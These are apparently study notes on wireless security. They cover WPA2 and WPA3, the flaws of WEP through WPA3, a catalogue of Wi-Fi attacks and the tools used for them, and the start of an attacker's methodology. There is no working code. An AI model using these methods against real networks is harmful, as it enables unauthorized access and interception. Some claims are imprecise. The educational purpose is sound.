		- Wi-Fi Protected Access 2 (WPA2) is a security protocol designed to safeguard wireless networks. It was introduced in 2004 and officially replaced WPA in 2006. WPA2 is fully compliant with the IEEE 802.11i standard and offers stronger security features than its predecessor.
		- One of WPA2’s most significant improvements is the adoption of the Advanced Encryption Standard (AES), which is FIPS 140-2 compliant and approved by the National Institute of Standards and Technology (NIST). WPA2 also implements the Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP), which enhances data protection and network access control. These security measures ensure that only authorized users can access the network while preventing unauthorized data interception.
		- Modes of Operation:
			- WPA2 offers two modes of operation:
			- WPA2-Personal (PSK Mode):
				- Uses a pre-shared key (PSK)—a password set in advance—to prevent unauthorized network access.
				- Each wireless device authenticates with the access point (AP) using the same 256-bit key, generated from the password.
				- In PSK mode, each wireless device encrypts network traffic using a 128-bit key, derived from an 8–63 character passphrase.
				- The router combines the passphrase, network SSID, and TKIP/AES to generate a unique encryption key for each wireless client.
				- Encryption keys are dynamically changed, providing enhanced security against brute-force attacks.
			- WPA2-Enterprise (802.1X / EAP Mode):
				- Uses Extensible Authentication Protocol (EAP) or a RADIUS server for centralized client authentication.
				- Supports multiple authentication methods, including:
					- Token cards
					- Kerberos
					- Digital certificates
						- Each system receives a unique encryption key, which is hidden from the user. This prevents key sharing and improves security.
						- Users must enter their login credentials, which are verified by a centralized authentication server before gaining network access.
		- How WPA2 Works:
			- WPA2 enhances security through AES-CCMP encryption, which ensures data integrity and protection against replay attacks. The process follows these steps:
			- Additional Authentication Data (AAD) is generated using the MAC header and is included in the encryption process.
				- This ensures that the unencrypted portion of the frame is protected from alteration or distortion.
			- A sequenced packet number (PN) and part of the MAC header are used to generate a Nonce, which is critical for encryption.
				- The protocol encrypts plaintext data using:
					- A temporal key
					- AAD (Additional Authentication Data)
					- Nonce
					- AES-CCMP encryption algorithm
				- A Packet Number (PN) is included in the CCMP header to protect against replay attacks.
			- The AES-CCMP encryption process produces:
				- Encrypted text
				- An encrypted Message Integrity Code (MIC)
			- Finally, the MAC header, CCMP header, encrypted data, and encrypted MIC are assembled into the WPA2 MAC frame, ready for secure transmission.
		- Conclusion:
			- WPA2 greatly enhances Wi-Fi security by using AES encryption and CCMP to replace the vulnerable WEP and WPA protocols. While WPA2-Personal is suitable for home users, WPA2-Enterprise provides higher security for corporate and enterprise networks by authenticating users through a centralized server.
			- However, despite its strong encryption, WPA2 is still vulnerable to brute-force attacks and KRACK (Key Reinstallation Attacks). This led to the development of WPA3, which further strengthens Wi-Fi security.
	- Wireless Encryption: WPA3:
		- Wi-Fi Protected Access 3 (WPA3) was introduced by the Wi-Fi Alliance in January 2018 as an advanced security protocol designed to improve upon WPA2. Like its predecessor, WPA3 offers two primary modes: WPA3-Personal and WPA3-Enterprise.
		- WPA3 introduces cutting-edge security features to simplify Wi-Fi protection, making networks more resilient to attacks while ensuring strong cryptographic standards. It leverages Advanced Encryption Standard (AES) and Protected Management Frames (PMF) to defend against eavesdropping, man-in-the-middle (MITM) attacks, and unauthorized data access. Additionally, WPA3 eliminates outdated legacy protocols, further strengthening network security.
		- Modes of Operation:
			- WPA3-Personal:
				- Designed for home and small office networks, providing password-based authentication.
				- Uses Simultaneous Authentication of Equals (SAE), also known as Dragonfly Key Exchange, replacing the PSK (Pre-Shared Key) model used in WPA2.
				- Enhances protection against offline attacks, brute-force attacks, and key recovery exploits.
				- Key Features of WPA3-Personal:
					- Resistance to offline dictionary attacks: Prevents attackers from capturing and decrypting Wi-Fi traffic using brute-force techniques.
					- Forward secrecy: Even if a password is compromised, previously transmitted data remains secure.
					- User-friendly security: Allows users to select easier-to-remember passwords without significantly compromising security.
					- Seamless transition from WPA2: Users can upgrade to WPA3 without changing their Wi-Fi connection methods.
			- WPA3-Enterprise:
				- Designed for corporate, government, and enterprise networks, offering stronger security measures than WPA2.
				- Utilizes advanced cryptographic standards to protect highly sensitive data.
				- Key Features of WPA3-Enterprise:
					- Authenticated encryption: Uses 256-bit Galois/Counter Mode Protocol (GCMP-256) to maintain data authenticity and confidentiality.
					- Key derivation and validation: Employs HMAC-SHA-384 (384-bit Hashed Message Authentication Code) for stronger key generation and integrity verification.
					- Key exchange and verification: Uses Elliptic Curve Diffie–Hellman (ECDH) and Elliptic Curve Digital Signature Algorithm (ECDSA) for secure key distribution.
					- Robust frame protection: Implements 256-bit Broadcast/Multicast Integrity Protocol Galois Message Authentication Code (BIP-GMAC-256) for enhanced data integrity.
		- Enhancements in WPA3 Compared to WPA2:
			- WPA3 introduces multiple security enhancements that provide stronger encryption, improved authentication, and better protection for public networks.
			- Stronger Handshake Mechanism:
				- Simultaneous Authentication of Equals (SAE), also called the Dragonfly handshake, replaces the WPA2 four-way handshake.
				- Prevents dictionary attacks and offline brute-force attacks by making password recovery significantly more difficult.
			- Wi-Fi Easy Connect:
				- Uses the Wi-Fi Device Provisioning Protocol (DPP) to simplify security configurations.
				- Allows IoT devices, smart home gadgets, and other wireless devices to connect securely using a QR code or password.
			- Opportunistic Wireless Encryption (OWE):
				- Replaces unencrypted public Wi-Fi authentication (802.11 open networks) with automatic encryption.
				- Protects users on public hotspots and open networks from passive eavesdropping and MITM attacks.
			- Increased Encryption Key Lengths:
				- WPA3-Enterprise supports 192-bit or higher encryption keys, making it more resistant to cryptographic attacks than WPA2.
		- Conclusion:
			- WPA3 provides a significant security upgrade over WPA2, making Wi-Fi networks more resilient against modern threats. With its stronger encryption algorithms, secure authentication methods, and improved public Wi-Fi protection, WPA3 is a critical step forward in wireless security.
			- However, not all devices support WPA3 yet. To take full advantage of WPA3’s security features, both the router and client devices must be WPA3-compatible. Many modern routers support WPA3/WPA2 mixed mode, allowing older devices to connect while offering WPA3-level security for supported devices.
	- Comparison of WEP, WPA, WPA2, and WPA3:
		- Wired Equivalent Privacy (WEP) was the first security protocol for wireless networks, but it is highly vulnerable to attacks and fails to meet modern security standards. Wi-Fi Protected Access (WPA) was introduced as an improvement over WEP, addressing many of its flaws. WPA2 further strengthened security by implementing robust encryption and authentication mechanisms, making wireless networks almost as secure as wired networks.
		- While WPA and WPA2 offer protections against forgery and replay attacks, WPA3 introduces even stronger security measures. It enhances password protection, secures IoT connections, and utilizes advanced encryption techniques to provide the highest level of Wi-Fi security available today.
		- To ensure a secure wireless network, it is recommended to replace WEP and WPA with either WPA2 or WPA3. The table below provides a comparison of WEP, WPA, WPA2, and WPA3 based on key security attributes, including encryption algorithms, key sizes, initialization vectors (IV), key management, and data integrity.
	- Issues with WEP:
		- Wired Equivalent Privacy (WEP) encryption is insufficient for securing wireless networks due to several vulnerabilities and weaknesses, including the following:
		- Weak Cryptographic Integrity:
			- CRC-32 is inadequate for cryptographic integrity: Attackers can capture two packets, flip bits in the encrypted stream, and modify the checksum to make the packet appear valid.
			- RC4 stream cipher vulnerabilities: RC4 was not designed for multiple-message encryption, making it unsuitable for WEP.
		- Small Initialization Vector (IV) Size and Reuse:
			- 24-bit IV is too small and is sent in cleartext: An access point (AP) transmitting 1,500-byte packets at 11 Mbps can exhaust the entire IV space in just five hours.
			- IV collisions enable attackers to reconstruct the RC4 keystream: This allows decryption of WEP-encrypted packets.
			- IV reuse leads to predictable keystreams: Repeating IV values compromise security, making it easier for attackers to decrypt data.
			- Wireless adapters from the same vendor may generate identical IV sequences, further weakening security.
		- Vulnerability to Attacks:
			- Known plaintext attacks: Attackers can determine the keystream by analyzing IV collisions.
			- Dictionary attacks: The small IV space allows attackers to build a decryption dictionary for cracking passwords.
			- Denial-of-Service (DoS) attacks: WEP does not authenticate associate and disassociate messages, making networks susceptible to DoS attacks.
			- Lack of replay attack protection: Attackers can capture and retransmit WEP packets without detection.
			- Bit-flipping attacks: Since CRC-32 is not a cryptographic hash function, attackers can modify packets while adjusting the checksum accordingly.
			- FMS (Fluhrer–Mantin–Shamir) attack: Exploits weaknesses in RC4 key scheduling, allowing attackers to recover WEP keys quickly using statistical analysis.
		- Lack of Secure Key Management:
			- Shared keys across all users: Changing the key requires reconfiguring every device, discouraging frequent key updates.
			- No built-in mechanism for key updates: WEP lacks a secure way to refresh encryption keys periodically.
		- Weak IV Generation:
			- WEP uses a predictable IV-generation method, making it easy for attackers to analyze patterns and derive encryption keys.
			- Appending the IV to the security key exposes networks to FMS attacks, allowing attackers to break the encryption.
			- Weak IVs leak key information, revealing portions of the encryption key over time.
		- Limited Authentication and Integrity Checks:
			- One-way authentication: WEP only authenticates the client to the access point (AP) but not the other way around, leaving clients vulnerable to rogue APs.
			- Message tampering is difficult to detect: Basic integrity checks like checksum and ICV are not cryptographically secure, making them vulnerable to forgery.
		- Practical Exploitation of WEP:
			- Attackers can construct a decryption table with just 24 GB of storage, allowing real-time decryption of WEP packets.
			- Packet sniffing tools like Aircrack-ng and WiFi-Cracker can easily exploit weak IVs to break WEP encryption.
			- Busy networks quickly exhaust IV values, forcing reuse and making attacks inevitable.
		- Conclusion: WEP encryption suffers from severe cryptographic flaws, weak key management, predictable IVs, and susceptibility to multiple attacks. These vulnerabilities make it possible for attackers to decrypt traffic, manipulate messages, and compromise network security with widely available tools. Because of these issues, WEP should not be used; instead, networks should be upgraded to WPA2 or WPA3 for stronger security.
	- Issues with WPA:
		- Wi-Fi Protected Access (WPA) is a significant improvement over WEP as it uses Temporal Key Integrity Protocol (TKIP) for data encryption, providing better security for wireless networks. However, WPA still has several security vulnerabilities, including the following:
		- Weak Passwords:
			- WPA Pre-Shared Key (PSK) is vulnerable to password-cracking attacks if users rely on weak or commonly used passwords.
			- Attackers can use dictionary and brute-force attacks to guess the WPA PSK and gain unauthorized access.
		- Lack of Forward Secrecy:
			- If an attacker captures the PSK, they can decrypt all packets encrypted with that key.
			- This means that past, present, and future transmissions using the compromised key can be decrypted, making WPA vulnerable to persistent attacks.
		- Vulnerability to Packet Spoofing and Decryption:
			- Clients using WPA-TKIP are susceptible to packet-injection attacks, where attackers can modify or insert malicious packets into the network.
			- This vulnerability can be exploited to hijack Transmission Control Protocol (TCP) sessions, allowing attackers to intercept sensitive data or manipulate network traffic.
		- Predictability of the Group Temporal Key (GTK):
			- WPA relies on random number generation (RNG) to create the Group Temporal Key (GTK) used for encrypting multicast and broadcast traffic.
			- If the RNG is weak, attackers can predict the GTK, enabling them to inject malicious traffic into the network and decrypt ongoing transmissions.
		- IP Address Guessing and Network Downgrade Attacks:
			- TKIP vulnerabilities allow attackers to guess the IP address of devices on the network.
			- Attackers can then inject small packets into the network, which can degrade network performance or force the network to downgrade encryption, making it easier to exploit.
		- Conclusion: While WPA addressed several weaknesses of WEP, it still has critical security flaws related to weak password protection, lack of forward secrecy, packet injection vulnerabilities, and predictable encryption keys. Due to these risks, WPA has been largely replaced by WPA2 and WPA3, which offer stronger encryption and authentication mechanisms.
	- Issues with WPA2:
		- Although WPA2 is significantly more secure than WPA, it still has several security vulnerabilities, which are discussed below:
		- Weak Passwords:
			- If users rely on weak or commonly used passwords, the WPA2 Pre-Shared Key (PSK) is vulnerable to attacks such as:
				- Eavesdropping – Attackers can capture and analyze network traffic.
				- Dictionary attacks – Automated tools can attempt common passwords to gain access.
				- Brute-force attacks – Attackers systematically try every possible password combination.
		- Lack of Forward Secrecy:
			- If an attacker captures the PSK, they can decrypt all previously transmitted and future packets encrypted with that key.
			- This lack of forward secrecy compromises the confidentiality of past communications if the key is exposed.
		- Vulnerability to Man-in-the-Middle (MITM) and Denial-of-Service (DoS) Attacks:
			- Hole196 vulnerability in WPA2 allows attackers to exploit the Group Temporal Key (GTK) to:
				- Perform MITM attacks, intercepting and modifying data in transit.
				- Execute DoS attacks, disrupting network availability.
		- Predictability of the GTK:
			- An insecure random number generator (RNG) in WPA2 can make the GTK predictable.
			- If compromised, attackers can:
				- Inject malicious traffic into the network.
				- Decrypt ongoing transmissions over the internet.
		- KRACK Vulnerabilities (Key Reinstallation Attack):
			- WPA2 is vulnerable to KRACK (Key Reinstallation Attack), which allows attackers to:
				- Sniff network traffic.
				- Hijack connections and inject malware.
				- Decrypt packets without knowing the Wi-Fi password.
		- Vulnerability to Wireless DoS Attacks:
			- Attackers can exploit WPA2's replay attack detection feature by sending forged group-addressed data frames with a large Packet Number (PN) to cause a Denial-of-Service (DoS) attack.
		- Insecure WPS PIN Recovery:
			- Wi-Fi Protected Setup (WPS) can be a security risk when enabled alongside WPA2 because:
				- Attackers can use brute-force techniques to determine the WPS Personal Identification Number (PIN).
				- Once the PIN is exposed, the WPA2 key can be easily recovered, granting unauthorized access to the network.
		- Conclusion: While WPA2 is more secure than WPA, it still has vulnerabilities related to weak passwords, key management flaws, MITM and DoS attacks, and KRACK exploits. To mitigate these risks, it is recommended to use strong passwords, disable WPS, and transition to WPA3, which offers improved encryption and authentication mechanisms.
	- Issues with WPA3:
		- Although WPA3 significantly enhances security compared to WPA2, it still has certain challenges and vulnerabilities, as outlined below:
		- Implementation Challenges:
			- Transitioning from WPA2 to WPA3 can be difficult for certain devices and networks.
			- Older devices may not support WPA3, leading to compatibility issues unless firmware updates are available.
		- Limited Adoption:
			- Slow adoption remains a major challenge. Many networks and devices still rely on WPA2, reducing the overall effectiveness of WPA3 security improvements.
			- Until WPA3 becomes widespread, mixed environments may retain vulnerabilities associated with WPA2.
		- Increased Resource Demand:
			- WPA3 employs stronger encryption algorithms, which require greater processing power.
			- This may impact performance on older or resource-constrained devices, leading to connectivity issues or slower speeds.
		- Configuration Errors:
			- Proper implementation and configuration are crucial for maximizing WPA3’s security benefits.
			- Weak passwords, poor network setup, or misconfigurations can still leave networks vulnerable despite WPA3’s enhancements.
		- Vulnerability to Timing Attacks:
			- WPA3 uses Simultaneous Authentication of Equals (SAE), also known as Dragonfly Key Exchange, to replace WPA2’s PSK-based authentication.
			- Some flawed implementations of SAE have been found vulnerable to timing attacks, potentially allowing attackers to recover network passwords.
		- Cache-Based Side-Channel Attacks:
			- Attackers can use cache access patterns to extract sensitive cryptographic information.
			- These side-channel attacks can potentially compromise secure data, weakening WPA3’s encryption safeguards.
		- Transition Mode Weakness:
			- WPA3 includes a "transition mode" to support backward compatibility with WPA2 devices.
			- In transition mode, both WPA2 and WPA3 are enabled, allowing older devices to connect via WPA2.
			- Attackers can exploit the weaker WPA2 connection (which remains vulnerable to attacks like KRACK) to compromise network security.
		- Hardware Requirements and Upgrade Costs:
			- Full WPA3 functionality requires updated hardware that supports its advanced security features.
			- Many older routers, network adapters, and IoT devices do not support WPA3 and cannot be upgraded via software updates.
			- Replacing hardware to support WPA3 can be expensive for both individual users and organizations.
		- Conclusion: While WPA3 provides stronger encryption, better authentication, and improved security, it still faces implementation, compatibility, and adoption challenges. Transition mode weaknesses, hardware limitations, and side-channel vulnerabilities highlight the importance of proper deployment and configuration. For optimal security, networks should disable WPA2 transition mode, use strong passwords, and ensure proper implementation of WPA3 features.
- Wireless Threats:
	- Wireless networks are vulnerable to various types of attacks, including access-control attacks, integrity attacks, confidentiality attacks, availability attacks, and authentication attacks. This section explores different security risks, threats, and attacks associated with wireless networks.
	- Access-Control Attacks:
		- Wireless access-control attacks aim to penetrate a network by bypassing WLAN access-control measures, such as AP MAC filters and Wi-Fi port access controls.
		- Several types of access-control attacks include:
			- MAC Spoofing: Using MAC spoofing, an attacker can modify a MAC address to appear as an authorized AP to a host on a trusted network. Tools such as SMAC can be used to facilitate this attack.
			- AP Misconfiguration: If critical security settings on an AP are improperly configured, the entire network can become vulnerable. Intrusion detection systems may fail to trigger alerts for misconfigured APs because they recognize them as legitimate devices.
		- Many organizations spend significant time defining and implementing Wi-Fi security policies. However, a client may unintentionally modify the security settings of an AP, leading to misconfigurations. A misconfigured AP can expose an otherwise secure network to attacks.
		- Since misconfigured APs are legitimate devices within the network, they can be difficult to detect. Attackers can connect through these APs, compromising security without triggering alerts. Many organizations fail to maintain Wi-Fi security policies and neglect proper measures to eliminate these vulnerabilities.
		- As organizations expand their Wi-Fi networks, misconfigured APs become an increasing threat. Key elements that contribute to this type of attack include:
			- SSID Broadcast:
				- Attackers configure APs to broadcast SSIDs to authorized users. Default SSIDs on APs are susceptible to brute-force dictionary attacks. Even with WEP enabled, an unencrypted SSID transmits the password in plaintext.
			- Weak Passwords:
				- Some administrators mistakenly use SSIDs as basic passwords for user verification. SSIDs function as rudimentary passwords, helping administrators identify authorized wireless devices.
			- Configuration Errors:
				- These include mistakes made during installation, misapplied policies, human errors while troubleshooting, and inconsistent security changes. Broadcasting an SSID is a common configuration error that allows attackers to steal SSIDs, making APs mistakenly recognize attackers as legitimate users.
			- Ad Hoc Associations:
				- Wi-Fi clients can communicate directly using ad-hoc mode, which does not require an AP to relay packets. While convenient for file sharing, this mode lacks strong authentication and encryption. Attackers can exploit ad-hoc mode to infiltrate networks, accessing wired LAN resources through compromised clients.
			- Promiscuous Clients:
				- Attackers exploit the behavior of 802.11 wireless cards, which automatically seek the strongest available signal. By placing an AP near the target Wi-Fi network with a common SSID and a stronger signal, attackers lure clients into connecting to their rogue AP, enabling them to intercept network traffic. This technique is similar to an "evil twin" attack, where an attacker mimics a legitimate AP.
			- Client Misassociation:
				- A client may intentionally or accidentally connect to an AP outside the legitimate network due to WLAN signals traveling through air, walls, and obstructions. This misassociation can lead to access-control attacks.
				- Client misassociation can occur due to:
					- Misconfigured clients
					- Inadequate corporate Wi-Fi coverage
					- Lack of Wi-Fi policies
					- Office internet restrictions
					- Ad-hoc connections not regularly managed
					- Attractive SSIDs
				- To execute a client misassociation attack, an attacker sets up a rogue AP outside the corporation’s perimeter. After learning the target SSID, the attacker spoofs it and broadcasts beacons to lure clients into connecting. Once connected, the attacker can bypass enterprise security policies and extract sensitive data, such as usernames and passwords, using MITM, EAP dictionary, or Metasploit attacks.
			- Unauthorized Association:
				- Unauthorized associations pose a significant threat to wireless networks and occur in two forms: accidental and malicious.
				- Malicious Association: An attacker uses a "soft AP" to impersonate a corporate AP. By running a tool that makes a laptop’s NIC appear as an AP, the attacker gains unauthorized access. Some WLAN radios embedded in PDAs and laptops allow attackers to launch soft APs directly or through malware. Once inside the network, the attacker can steal credentials, attack wired networks, or install malware.
			- Accidental Association: This happens when a device unintentionally connects to an overlapping AP from a neighboring organization without the user's knowledge.
	- Integrity Attacks:
		- An integrity attack involves altering or modifying data during transmission. In wireless integrity attacks, attackers send forged control, management, or data frames over a wireless network to mislead wireless devices and execute further attacks, such as a Denial-of-Service (DoS) attack.
		- Different types of integrity attacks:
			- Data-Frame Injection:
				- This attack involves constructing and sending forged 802.11 frames to manipulate network communication.
				- Common tools used for this attack include Airpwn-ng and Wperf.
			- WEP Injection:
				- Attackers create and transmit forged WEP encryption keys to compromise wireless security.
				- WEP cracking and injection tools are commonly used for this type of attack.
			- Bit-Flipping Attacks:
				- In this attack, the attacker captures a frame, flips random bits in the data payload, modifies the Integrity Check Value (ICV), and sends the altered frame back to the user.
			- Extensible AP Replay:
				- This involves capturing 802.1X Extensible Authentication Protocol (EAP) messages, such as Identity, Success, and Failure messages, for later replay.
				- Wireless capture and injection tools are typically used between the client and the access point (AP) to execute this attack.
			- Data Replay:
				- Attackers capture 802.11 data frames and replay them later, sometimes after modifying them.
				- Capture and injection tools facilitate this type of attack.
			- Initialization Vector (IV) Replay Attacks:
				- This method derives the keystream by repeatedly sending a plaintext message, allowing the attacker to compromise encryption.
			- RADIUS Replay:
				- In this attack, the attacker captures RADIUS Access-Accept or Reject messages for later replay.
				- Ethernet capture and injection tools are commonly used between the AP and the authentication server to carry out this attack.
			- Wireless Network Viruses
				- Wireless network viruses pose a significant threat by providing attackers with an easy way to compromise access points (APs). These viruses can spread quickly, affecting multiple devices on the network.
	- Confidentiality Attacks:
		- Confidentiality attacks aim to intercept sensitive information transmitted over a wireless network, regardless of whether the data is sent in cleartext or an encrypted format. If the system transmits data using encryption (such as WEP or WPA), an attacker may attempt to break the encryption to gain unauthorized access.
		- Different types of confidentiality attacks on wireless networks:
			- Eavesdropping:
				- Attackers capture and decode unprotected application traffic to extract potentially sensitive information.
				- Common tools for this attack include Wireshark, Ettercap, Kismet, and commercial network analyzers.
			- Traffic Analysis:
				- This attack involves observing external traffic characteristics to infer information about the communication.
				- Tools like Wireshark, Ettercap, and Snort are commonly used for traffic analysis.
			- Cracking WEP Key:
				- Attackers capture data packets to recover a WEP encryption key using brute force or Fluhrer-Mantin-Shamir (FMS) cryptanalysis.
				- Tools such as Aircrack-ng and WEPCrack facilitate this attack.
			- Evil Twin AP:
				- In this attack, an attacker sets up a rogue access point (AP) that mimics a legitimate WLAN SSID to lure users into connecting to it.
				- Tools like Hostapd, EvilTwinFramework, and Wifiphisher are commonly used for this purpose.
			- Honeypot AP:
				- Similar to an Evil Twin AP, a honeypot AP uses the same SSID as a legitimate AP to trick users into connecting.
				- Attackers achieve this by manipulating SSID settings.
			- Session Hijacking:
				- Attackers manipulate the network so that their device appears to be the intended destination, allowing them to take over an active session.
				- This attack often involves packet manipulation techniques.
			- Masquerading:
				- In this attack, an attacker pretends to be an authorized user to gain access to the system.
				- This is typically done by stealing login credentials or bypassing authentication mechanisms.
			- Man-in-the-Middle (MITM) Attack:
				- Attackers deploy MITM techniques using a rogue AP to intercept TCP sessions or hijack Secure Sockets Layer (SSL)/Secure Shell (SSH) tunnels.
				- Tools such as dsniff, Ettercap, and aLTEr attack are used to execute this attack.
	- Availability Attacks:
		- Availability attacks aim to disrupt wireless services for legitimate users by either crippling WLAN resources or denying access to these resources. These attacks make wireless network services unavailable to authorized users. Attackers can execute availability attacks in various ways, obstructing the functionality of wireless networks.
		- Different types of availability attacks:
			- Access Point Theft:
				- This attack involves physically removing an AP from its installed location, effectively disrupting the wireless network.
				- Attackers rely on stealth and speed to execute this attack.
			- Disassociation Attacks:
				- Attackers destroy the connectivity between an AP and a client, making the target unavailable to other wireless devices.
				- This is done through intentional disruption of connectivity.
			- EAP-Failure Attack:
				- Attackers observe a valid 802.1X EAP exchange and then send a forged EAP-Failure message to the client, terminating authentication.
				- Airtool Pi is commonly used for this attack.
			- Beacon Flood:
				- In this attack, thousands of counterfeit 802.11 beacons are generated, making it difficult for clients to locate a legitimate AP.
			- Denial-of-Service (DoS) Attack:
				- Attackers exploit the carrier-sense multiple access with collision avoidance (CSMA/CA) clear channel assessment (CCA) mechanism to make a channel appear busy, preventing legitimate devices from transmitting.
				- This requires an adapter that supports CW Tx mode along with a low-level utility to enable continuous transmissions.
			- De-authentication Flood:
				- Attackers flood client devices with forged de-authentication or disassociation frames, forcing them to disconnect from an AP.
				- AirJack is a common tool used for this attack.
			- Routing Attacks:
				- Attackers manipulate routing information within the network to mislead devices.
				- They exploit protocols such as RIP, Ad-Hoc On-Demand Distance Vector (AODV), and Dynamic Source Routing (DSR) using techniques like wormhole and sinkhole attacks.
			- Authentication Flood:
				- Attackers send forged authentication or association requests from random MAC addresses, filling the target AP’s association table and preventing new clients from connecting.
				- AirJack is a tool commonly used for this attack.
			- Address Resolution Protocol (ARP) Cache Poisoning:
				- Attackers manipulate the ARP cache by creating multiple attack vectors, redirecting network traffic, and potentially causing denial of service.
			- Power Saving Attacks:
				- In this attack, attackers send spoofed Traffic Indication Map (TIM) or Delivery TIM (DTIM) frames to a client in power-saving mode, making it vulnerable to a DoS attack.
			- TKIP MIC Exploit:
				- Attackers generate invalid Temporal Key Integrity Protocol (TKIP) data to exceed an AP’s Message Integrity Check (MIC) error threshold, forcing the AP to suspend WLAN service.
	- Authentication Attacks:
		- Authentication attacks aim to steal the identity of Wi-Fi clients, including their personal information, login credentials, and other sensitive data, to gain unauthorized access to network resources.
		- Different types of authentication attacks on wireless networks:
			- PSK Cracking:
				- Attackers recover a WPA Pre-Shared Key (PSK) by capturing key handshake frames and using a dictionary attack.
				- Common tools for this attack include Cowpatty and Fern Wifi Cracker.
			- LEAP Cracking:
				- This attack involves recovering user credentials from captured 802.1X Lightweight EAP (LEAP) packets using a dictionary attack to crack the NT password hash.
				- Tools like Asleap and THC-LEAPcracker are commonly used.
			- VPN Login Cracking:
				- Attackers use brute-force techniques to obtain user credentials for Virtual Private Network (VPN) authentication, such as Point-to-Point Tunneling Protocol (PPTP) passwords or IPsec pre-shared secret keys.
				- Tools for this attack include ike_scan and IKECrack (for IPsec) and Anger and THC-pptp-bruter (for PPTP).
			- Domain Login Cracking:
				- This attack targets Windows domain logins by cracking NetBIOS password hashes using brute-force or dictionary-based attacks.
				- Tools such as John the Ripper, L0phtCrack, and THC-Hydra are commonly used.
			- Key Reinstallation Attack (KRACK):
				- Attackers exploit vulnerabilities in the WPA2 four-way handshake process using a nonce reuse technique, allowing them to decrypt and manipulate wireless traffic.
				- This uses nonce reuse technique.
			- Identity Theft:
				- Attackers capture user identities from cleartext 802.1X Identity Response packets using packet capturing tools.
			- Shared Key Guessing:
				- This attack attempts 802.11 shared key authentication using vendor-default WEP keys or previously cracked WEP keys.
				- Tools such as WEP cracking tools and Wifite are commonly used.
			- Password Speculation:
				- Attackers repeatedly attempt 802.1X authentication using a captured identity to guess the user’s password through dictionary attacks.
				- A password dictionary is typically used for this attack.
			- Application Login Theft:
				- Attackers capture user credentials, such as email addresses and passwords, from cleartext application protocols.
				- Common tools for this attack include Ace Password Sniffer, dsniff, and Wi-Jacking Attack.
	- Honeypot AP Attack:
		- In areas where multiple WLANs coexist, users can connect to any available network, making them vulnerable to attacks. When a wireless client is switched on, it probes nearby wireless networks for a specific SSID. Attackers exploit this behavior by setting up an unauthorized wireless network using a rogue access point (AP).
		- This rogue AP, known as a honeypot AP, is equipped with high-power (high-gain) antennas and configured with the same SSID as the target network. Users who frequently connect to multiple WLANs may unknowingly connect to the honeypot AP. These rogue APs transmit a stronger beacon signal than legitimate APs, tricking network interface cards (NICs) into connecting to them based on signal strength.
		- If an authorized user connects to a honeypot AP, a security vulnerability is created. The attacker can intercept sensitive user information, such as identity details, usernames, and passwords, potentially compromising network security.
	- Wormhole Attack:
		- A wormhole attack exploits dynamic routing protocols such as Dynamic Source Routing (DSR) and Ad-Hoc On-Demand Distance Vector (AODV). In this attack, an attacker strategically positions themselves within the target network to sniff and record ongoing wireless transmissions. The attacker then advertises that their malicious node has the shortest route for transmitting data to other nodes in the network. To achieve this, the attacker creates a tunnel that forwards data between the source and destination nodes.
		- In wireless sensor networks, protocols like AODV and DSR use route request (RREQ) and route reply (RREP) messages to dynamically establish a route between source and destination nodes. For example:
			- A source node (S) broadcasts an RREQ packet to find a route to the destination node (D).
			- The destination node (D) responds with an RREP packet, a unicast message containing the route information to reach D.
			- When S receives the RREP message, it stores the route in its cache and begins forwarding application data to D via the established path.
		- In a wormhole attack, the attacker introduces a malicious node (M) within the transmission range of both S and D to build a tunnel between them. The attacker:
			- Listens for network traffic, waiting for RREQ messages.
			- Sniffs the RREQ message from S and forwards it directly to D, bypassing the usual route discovery process.
			- Similarly, intercepts the RREP message from D and forwards it to S before the original RREP message arrives.
			- This creates a fake direct link between S and D via M, misleading both nodes into using the malicious route.
			- Once the tunnel is successfully established, the attacker controls the data flow between S and D and may launch additional attacks, such as packet modification, eavesdropping, or denial-of-service (DoS) attacks.
		- Wormhole attacks pose a serious threat to wireless sensor networks, as they allow attackers to manipulate routing and application data in real time. This can severely impact the confidentiality, integrity, and availability of network communications.
	- Sinkhole Attack:
		- A sinkhole attack is a type of selective forwarding attack in which an attacker advertises a compromised or malicious node as the shortest possible route to the base station. By placing the malicious node near the base station, the attacker attracts neighboring nodes with fake routing information and then performs a data forging attack. This allows the attacker to sniff, intercept, and manipulate ongoing network transmissions.
		- A sinkhole attack can also be executed alongside a wormhole attack, where the malicious node captures all network traffic and uses a tunneling technique to reach the base station faster than legitimate nodes. Because of its deceptive nature, a sinkhole attack is difficult to detect and can significantly impact higher-layer applications within the Open Systems Interconnection (OSI) model.
	- Inter-Chip Privilege Escalation / Wireless Co-Existence Attack:
		- An inter-chip privilege escalation attack exploits vulnerabilities in wireless chips that manage Bluetooth and Wi-Fi communications. Manufacturers typically design these as separate chips or as a combo chip that integrates both functionalities.
		- Attackers exploit combo chips by compromising one chip to steal data from another or to escalate privileges within the system. For example, a Bluetooth chip sharing resources with a Wi-Fi chip may:
			- Intercept credentials or sensitive data from the Wi-Fi chip.
			- Manipulate network traffic passing through the Wi-Fi chip.
		- This form of attack is known as a wireless co-existence attack, as it exploits the shared resources and communication channels between wireless chips. It can lead to privilege escalation across chip boundaries, compromising system security.
- Wireless Hacking Methodology:
	- The wireless hacking methodology enables attackers to identify vulnerabilities and entry points within a target network. By following these steps, attackers aim to gain unauthorized access and exploit network resources. The primary objective of wireless hacking is to compromise a Wi-Fi network and obtain unauthorized access to sensitive data or services.
	- Attackers typically follow these steps to carry out a wireless attack:
		- Wi-Fi Discovery – Identifying available wireless networks and their security configurations.
		- Wireless Traffic Analysis – Capturing and analyzing network traffic to detect vulnerabilities.
		- Launching Wireless Attacks – Exploiting security flaws to gain access to the network.
		- Wi-Fi Encryption Cracking – Breaking encryption mechanisms to retrieve network credentials.
		- Compromising the Wi-Fi Network – Gaining unauthorized access and leveraging control over network resources.
	- Wi-Fi Discovery:
		- The first step in attacking a Wi-Fi network is discovering available networks or devices. An attacker performs Wi-Fi discovery to locate a target wireless network using tools such as inSSIDer and NetSurveyor. Wi-Fi discovery involves footprinting the wireless networks and identifying a target network within range to launch an attack.
		- Wireless Network Footprinting:
			- An attack on a wireless network begins with discovery and footprinting. Footprinting involves identifying and analyzing a network's structure. To footprint a wireless network, an attacker must identify the Basic Service Set (BSS) provided by the Access Point (AP). This can be done by determining the Service Set Identifier (SSID) of the network, which allows the attacker to establish an association with an AP and potentially compromise its security.
			- Attackers use two main footprinting methods to detect a wireless network's SSID:
				- Passive Footprinting Method: In passive footprinting, an attacker sniffs packets from the airwaves to detect the presence of APs, wireless devices, and their SSIDs. The attacker does not actively connect to any APs or inject data packets into the network traffic, making this method stealthier.
